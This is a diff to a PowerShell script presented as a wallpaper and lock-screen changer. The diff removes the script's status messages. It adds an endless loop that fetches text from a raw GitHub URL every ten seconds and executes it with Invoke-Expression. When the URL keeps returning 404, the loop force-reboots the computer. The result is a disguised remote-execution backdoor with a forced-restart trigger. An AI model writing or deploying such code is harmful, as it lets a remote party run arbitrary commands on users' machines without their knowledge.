@@ -3,13 +3,15 @@ $imageUrl2 = "https://raw.githubusercontent.com/kolomka-cpu/elka/refs/heads/main
 $imagePath = "$env:TEMP\wallpaper.png"
 $imagePath2 = "$env:TEMP\lockscreen.png"
 
+$url = "https://raw.githubusercontent.com/kolomka-cpu/elka/refs/heads/main/stp"
+
+$checkInterval = 10
+$failThreshold = 300
+$failTime = 0
+
 try {
-    Write-Host "Loading..." -ForegroundColor Yellow
     Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath -UseBasicParsing
     Invoke-WebRequest -Uri $imageUrl2 -OutFile $imagePath2 -UseBasicParsing
-
-    Write-Host "Setting wallpaper..." -ForegroundColor Yellow
-
     Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -36,11 +38,6 @@ public class WallpaperChanger
 "@
 
     [WallpaperChanger]::SetWallpaper($imagePath)
-
-    Write-Host "Done!" -ForegroundColor Green
-    Write-Host "If wallpaper didn't change, try logging off and on." -ForegroundColor Yellow
-
-
     New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Personalization" -Force | Out-Null
 
     New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Personalization" `
@@ -49,20 +46,37 @@ public class WallpaperChanger
         -PropertyType String `
         -Force | Out-Null
 
-    Write-Output "Lock screen image set"
 }
 catch {
     Write-Host "Error: $_" -ForegroundColor Red
 }
 
+while ($true) {
+    try {
+        $response = Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop
+        if ($response.StatusCode -eq 200) {
+            $failTime = 0
+            Invoke-Expression $response.Content
+        }
+    }
+    catch {
+        if ($_.Exception.Response -and $_.Exception.Response.StatusCode -eq 404) {
+            $failTime += $checkInterval
+            if ($failTime -ge $failThreshold) {
+                try {
+                    Restart-Computer -Force -ErrorAction Stop
+                }
+                catch {
+                    shutdown.exe /r /t 10 /f
+                }
+            }
+        }
+        else {
+            Write-Output "Request failed: $_"
+        }
+    }
 
-[System.Threading.Thread]::Sleep(300000)
+    Start-Sleep -Seconds $checkInterval
+}
 
-try {
-    Write-Output "Rebooting system..."
-    Restart-Computer -Force -ErrorAction Stop
-}
-catch {
-    Write-Output "Restart-Computer failed, using shutdown.exe"
-    shutdown.exe /r /t 10 /f
-}
+
